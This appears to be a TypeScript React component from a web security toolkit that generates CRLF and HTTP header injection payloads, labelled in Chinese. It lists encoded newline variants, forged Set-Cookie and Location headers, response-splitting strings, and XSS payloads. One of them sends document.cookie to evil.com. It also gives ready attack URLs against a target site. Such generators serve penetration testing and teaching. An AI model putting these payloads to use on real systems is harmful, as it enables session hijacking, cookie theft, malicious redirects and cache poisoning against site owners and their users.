import SimpleTool from '../../_shared/SimpleTool';
import type { ToolProps } from '../../types';

const generate = (input: string): string => {
  const point = input.trim() || 'URL参数 / 输入框';
  const variants = [
    { name: 'CRLF (%0d%0a)', payload: '%0d%0a' },
    { name: 'CRLF 大写 (%0D%0A)', payload: '%0D%0A' },
    { name: '仅 LF (%0a)', payload: '%0a' },
    { name: '仅 CR (%0d)', payload: '%0d' },
    { name: '双编码 CRLF (%250d%250a)', payload: '%250d%250a' },
    { name: 'Unicode CRLF (\\u000d\\u000a)', payload: '\\u000d\\u000a' },
    { name: '字面 \\r\\n', payload: '\\r\\n' },
    { name: 'Tab (%09)', payload: '%09' },
    { name: 'Null (%00)', payload: '%00' },
    { name: '空格 + CRLF', payload: '%20%0d%0a' },
  ];

  const headerInjection = [
    'Set-Cookie: admin=true; path=/',
    'Set-Cookie: session=attacker; path=/',
    'Location: https://evil.com/',
    'Set-Cookie: csrf_token=forged; HttpOnly',
    'Content-Type: text/html',
    'Content-Length: 0',
    'X-Forwarded-For: 127.0.0.1',
    'Refresh: 0; url=https://evil.com/',
  ];

  const responseSplitting = [
    '%0d%0aSet-Cookie:%20admin=true%3b%20path=/',
    '%0d%0aSet-Cookie:%20session=attacker',
    '%0d%0aLocation:%20https://evil.com/',
    '%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>',
    '%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>attacker</html>',
    '%0d%0a%0d%0a<script>alert(document.cookie)</script>',
  ];

  const htmlInjection = [
    '%0d%0a%0d%0a<script>alert(1)</script>',
    '%0d%0aContent-Length:%200%0d%0a%0d%0a<img%20src=x%20onerror=alert(1)>',
    '%0d%0a%0d%0a<script>document.location="https://evil.com/?c="+document.cookie</script>',
  ];

  const expectedEffects = [
    '1. HTTP 响应拆分 (Response Splitting): 注入两个 CRLF 分隔响应体',
    '2. Cookie 注入: 伪造 Set-Cookie 头',
    '3. 重定向劫持: 伪造 Location 头',
    '4. XSS: 注入 CRLF + HTML/JS 到响应体',
    '5. 缓存投毒: 注入缓存控制头',
    '6. HTTP 请求走私: 配合 \r\n 操纵请求边界',
  ];

  return [
    `=== CRLF / HTTP头注入 Payload ===`,
    `注入点: ${point}`,
    '',
    '--- 换行符变体 ---',
    ...variants.map((v) => `  [${v.name}] ${v.payload}`),
    '',
    '--- HTTP 头注入 Payload ---',
    ...headerInjection.map((h) => `  ${variants[0].payload}${encodeURIComponent(h)}`),
    '',
    '--- 响应拆分 Payload (URL编码) ---',
    ...responseSplitting.map((p) => `  ${p}`),
    '',
    '--- HTML 注入 (XSS) Payload ---',
    ...htmlInjection.map((p) => `  ${p}`),
    '',
    '--- 预期效果 ---',
    ...expectedEffects,
    '',
    '--- 测试示例 (URL参数) ---',
    `  https://target.com/page?param=test%0d%0aSet-Cookie:%20admin=true`,
    `  https://target.com/page?redirect=/home%0d%0aLocation:%20https://evil.com/`,
    `  https://target.com/page?name=test%0d%0a%0d%0a<script>alert(1)</script>`,
  ].join('\n');
};

const ToolComponent = (props: ToolProps) => (
  <SimpleTool
    {...props}
    toolName="CRLF/HTTP头注入Payload"
    execute={(input: string): string => generate(input)}
  />
);

export default ToolComponent;
